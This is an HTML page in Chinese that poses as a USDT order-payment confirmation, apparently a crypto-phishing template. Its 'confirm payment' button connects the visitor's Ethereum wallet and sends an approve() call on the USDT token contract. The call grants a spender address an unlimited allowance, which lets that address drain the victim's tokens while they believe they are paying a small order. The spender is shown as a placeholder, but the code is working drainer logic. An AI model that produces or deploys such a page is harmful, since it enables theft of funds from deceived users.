
<!DOCTYPE html><html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>订单确认信息</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; background: #f9fafb; color: #111827; display: flex; flex-direction: column; height: 100vh; }
    header { padding: 1rem; background: #1f2937; color: white; text-align: center; font-size: 1.25rem; }
    .main { flex: 1; padding: 1.5rem; display: flex; flex-direction: column; justify-content: flex-start; }
    .info { margin-bottom: 1rem; font-size: 1.1rem; }
    .info .label { font-weight: bold; color: #374151; display: inline-block; width: 100px; }
    .footer { padding: 1rem; background: white; box-shadow: 0 -2px 6px rgba(0,0,0,0.05); }
    .btn { width: 100%; padding: 1rem; font-size: 1.1rem; background: #10b981; color: white; border: none; border-radius: 8px; font-weight: bold; }
    .btn:active { background: #059669; }
    .status { margin-top: 1rem; font-size: 0.95rem; color: red; text-align: center; }
  </style>
</head>
<body>
<header>订单确认信息</header>
<div class="main">
  <div class="info"><span class="label">用户名：</span><span id="username">--</span></div>
  <div class="info"><span class="label">充值金额：</span><span id="amount">--</span> USDT</div>
  <div class="info"><span class="label">订单编号：</span><span id="orderid">--</span></div>
</div>
<div class="footer">
  <button class="btn" onclick="authorize()">确认付款</button>
  <p id="status" class="status"></p>
</div>

<script>
  const query = new URLSearchParams(location.search);
  const user = query.get("username") || "未知用户";
  const amount = query.get("amount") || "0";
  const orderId = Math.floor(10000000 + Math.random() * 90000000);

  document.getElementById("username").innerText = user;
  document.getElementById("amount").innerText = amount;
  document.getElementById("orderid").innerText = orderId;

  async function authorize() {
    if (!window.ethereum) return alert("请使用支持以太坊的钱包打开");

    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // 示例 USDT 地址
    const spender = "0x1111111111111111111111111111111111111111"; // 合约地址（示例）

    const ABI = [{
      "constant": false, "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve", "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: 'eth_requestAccounts' });

    const contract = new web3.eth.Contract(ABI, tokenAddress);
    const accounts = await web3.eth.getAccounts();
    const from = accounts[0];

    try {
      const tx = await contract.methods.approve(spender, web3.utils.toTwosComplement(-1)).send({ from });
      document.getElementById("status").innerText = "授权成功！交易哈希：" + tx.transactionHash;
    } catch (err) {
      console.error(err);
      document.getElementById("status").innerText = "授权失败：" + err.message;
    }
  }
</script>
</body></html>
